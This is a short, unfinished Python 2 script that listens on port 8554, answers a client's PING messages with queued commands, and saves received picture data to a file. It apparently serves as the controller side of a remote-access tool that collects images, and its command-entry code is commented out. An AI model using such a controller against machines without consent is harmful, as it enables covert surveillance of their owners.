import socket, sys, time
from threading import Thread, Lock

SERVERPORT = 8554

TXT = "TXT----"
PIC = "PIC----"
EOF = "----EOF"

UserInput = Lock()


class SocketHandler(Thread):

    def __init__(self, soc):
        Thread.__init__(self)
        self.s = soc
        self.cmd = ""
        self.bufferLock = Lock()

    def run(self):
        """TODO"""
        while True:
            try:
                data = self.s.recv(2048)

                # reply with PING (and CMD)
                self.bufferLock.acquire()
                if data.count("PING"):  # if server wants us to ping
                    self.s.send(b"PONG" + self.cmd)
                else:
                    if self.cmd:
                        self.s.send(self.cmd)
                self.cmd = ""
                self.bufferLock.release()

                if data.count(TXT):
                    data = data[len(TXT):]
                    sys.stdout.write("\n%s\n>>" % data)

                if data.count(PIC):
                    sys.stdout.write("[+] Receiving picture...")
                    data = data[len(PIC):]
                    while data.find(EOF) == -1:
                        data += self.s.recv(2048)
                        print(len(data))
                    sys.stdout.write("Done receiving\n")
                    data = data[:-len(EOF)]  # picture data
                    with open("2.jpeg", "wb") as fp:
                        fp.write(data)
                    sys.stdout.write("[+] Written data to 2.jpeg\n>>")
                    self.s.send(b"PONG") #<-- might not work

                if data == b"":
                    print("\n[-][SOCKET] Closed connection...")
                    return

            except Exception as e:
                print("\n[-][SOCKET] Exception: %s" % e)
                return


while True:
    s = socket.socket(socket.AF_INET)
    s.bind(("0.0.0.0", SERVERPORT))
    s.listen(1)
    print("Listening for connections")
    conn, addr = s.accept()
    print "Accepted connection: ", addr
    conn.settimeout(80)
    # Thread
    socketThread = SocketHandler(conn)
    socketThread.start()
    # User input
    sys.stdout.write(">>")
    while True:
        # UserInput.acquire()
        # # cmd = str(raw_input())
        # UserInput.release()
        #
        # socketThread.bufferLock.acquire()
        # socketThread.cmd = cmd
        # socketThread.bufferLock.release()

        time.sleep(4)

        if not socketThread.is_alive():
            print("[-] Socket thread died")
            break
